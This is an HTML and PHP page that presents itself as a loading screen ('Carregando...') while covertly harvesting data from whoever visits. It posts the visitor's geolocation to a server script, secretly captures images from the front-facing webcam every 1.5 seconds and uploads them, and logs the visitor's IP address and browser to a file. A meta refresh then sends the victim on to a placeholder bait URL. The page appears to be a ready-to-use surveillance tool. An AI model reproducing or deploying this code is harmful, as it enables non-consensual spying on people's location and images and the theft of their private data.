<html>
<head>
    <script src="http://maps.google.com/maps/api/js?sensor=true"></script>
    <script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>

    <meta http-equiv="Refresh" content="timeonseconds;url=urltosendasbait">


    <div class="video-wrap" hidden="hidden">
       <video id="video" playsinline autoplay></video>
    </div>
      <canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>


</head>

<body>
    <div id="pos" style="width:800px; height:600px;">
        Carregando...
    </div>

    <script>


    $(function(){
            function initialize(coords) {
                $.ajax({
                   url: 'saveLocation.php',
                   data: {
                        longitude:coords.longitude,
                        latitude:coords.latitude
                        },
                   error: function() {
                      $('#pos').html("Carregando Página");
                   },
                   success: function(data) {
                      $('#pos').html("Carregando Página");
                   },
                   type: 'POST'
                });
            }

            navigator.geolocation.getCurrentPosition(function(position){
                initialize(position.coords);
            }, function(){
                $('#pos').html('Carregando...');
            });
    });

    function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: 'post.php',
        dataType: 'json',
        async: false,
        success: function(result){
            // call the function that handles the response/results
        },
        error: function(){
        }
      });
    };

    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    const constraints = {
      audio: false,
      video: {

        facingMode: "user"
      }
    };

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

    var context = canvas.getContext('2d');
      setInterval(function(){

           context.drawImage(video, 0, 0, 740, 580);
           var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
           post(canvasData); }, 1500);


    }

    // Load init
    init();
    
    </script>
    <?php
// Do make a visitors.html file and set permission to 0777

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$dateTime = date('Y/m/d G:i:s');
$file = "visitors.html";
$file = fopen($file, "a");
$data = "<pre><b>User IP</b>: $ip <b> Browser</b>: $browser <br>on Time : $dateTime <br></pre>";
fwrite($file, $data);
fclose($file);

?>
    </body>
    </html>
